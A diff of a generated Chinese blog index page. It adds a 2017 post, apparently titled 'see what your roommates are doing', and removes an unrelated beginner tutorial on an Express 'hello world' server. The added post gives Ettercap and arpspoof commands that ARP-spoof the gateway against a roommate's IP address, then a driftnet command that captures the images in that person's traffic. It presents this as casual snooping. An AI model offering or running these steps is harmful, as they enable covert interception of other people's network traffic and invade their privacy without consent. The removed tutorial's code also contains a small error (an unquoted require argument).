@@ -151,6 +151,75 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-查看室友都在干什么" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/13/查看室友都在干什么/">title</a>
+    </h1>
+  
+
+        
+        <a href="/2017/08/13/查看室友都在干什么/" class="archive-article-date">
+  	<time datetime="2017-08-13T11:47:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-13</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol>
+<li>电脑 kali linux</li>
+<li>2.Nmap  网络扫描和嗅探工具包</li>
+<li>Ettercap   arp诈骗 或者用 Arpspoof -</li>
+<li>driftnet  图片捕获</li>
+</ol>
+<ol>
+<li><p><code>ifconfig</code>查看是 waln0还是 eth0</p>
+</li>
+<li><p><code>ettercap -i wlan0 -Tq -m arp:remote /192.167...//网关/</code></p>
+</li>
+<li><p>或者 <code>Arpspoof -I eth0 -t 192.168.1.1 (网关) 192.168.1.100(被观察)</code></p>
+<ul>
+<li>如果是有线网络那就eth0  无线就waln0</li>
+</ul>
+</li>
+<li><p><code>driftnet -i wlan0  -b</code></p>
+<p>然后可以愉快的看看了</p>
+<p><img src="/Users/zzd/Desktop/default.png" alt="default"></p>
+<p>​</p>
+</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/08/13/查看室友都在干什么/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+  
     <article id="post-vue cli 配置" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -706,77 +775,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2017/06/12/mongodb/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-hello Express" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="hello-Express"><a href="#hello-Express" class="headerlink" title="hello Express"></a>hello Express</h1><p><strong>这个Express 个人学习手册</strong></p>
-<p>Express 是一个 node 的后端框架. </p>
-<ol>
-<li><p>安装Express </p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mkdir hello-express </div><div class="line">cd hello-express</div><div class="line">npm init </div><div class="line"></div><div class="line">npm install --save express || yarn add express</div></pre></td></tr></table></figure>
-<p><strong>注意  虽然 node.js 7.0+  对ES6 的支持 已经到了99%  但是node 不支持ES6模块语法 用require 代替import</strong></p>
-</li>
-</ol>
-<p>2.创建 index.js 内容如下:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> express =<span class="built_in">require</span>(express);</div><div class="line"><span class="keyword">const</span> app = express();</div><div class="line"></div><div class="line">app.get(<span class="string">'/'</span>, (req, res)=&gt;&#123;</div><div class="line">  res.send(<span class="string">'Hello World'</span>);</div><div class="line">&#125;)</div><div class="line"></div><div class="line"></div><div class="line">app.listen(<span class="number">3000</span>,() =&gt; &#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'runing on port 3000'</span>);</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
-<ul>
-<li><p>上面的3000 指的是3000端口  英文 port </p>
-</li>
-<li><p>代码中 <code>get(/)</code>  </p>
-<ul>
-<li>get 是一个http 的请求  还有 post/delete/put</li>
-<li>/ 是一个路径  ,英文 path</li>
-</ul>
-</li>
-<li><p>代码中 req 是 request <strong>请求</strong> 缩写 ,res 是 response <strong>响应</strong> 的 缩写 </p>
-</li>
-<li><p><code>res.send(&#39;Hello world&#39;);</code> 是从后端向前端浏览器返回字符串 <strong>Hello World</strong></p>
-<p>​</p>
-<p>ps: const 和let 的区别,  const 是只读变量 ,let 是可修改变量</p>
-</li>
-</ul>
-<ol>
-<li>启动  node index.js<ul>
-<li>打开浏览器 输入 <code>http://localhost:3000</code>   <code>localhost</code>  就是我们自己机器的域名 IP 127.0.0.1</li>
-<li>页面会显示 Hello word</li>
-<li>但是每次更改源码都得手动启动 很麻烦 这里 推荐一个包 <code>nodemon</code>安装 <ul>
-<li><code>npm install -g nodemon</code> 全局安装</li>
-<li>使用 <code>nodemon index.js</code>    只要更改就会自动刷新页面✧(≖ ◡ ≖✿)嘿嘿</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上 我 实现了一个基于 Express 服务器 网站  并且输出了 hello word  (๑•̀ㅂ•́)و✧加油 </p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/06/07/hello Express/">展开全文 >></a>
         </p>
       
 
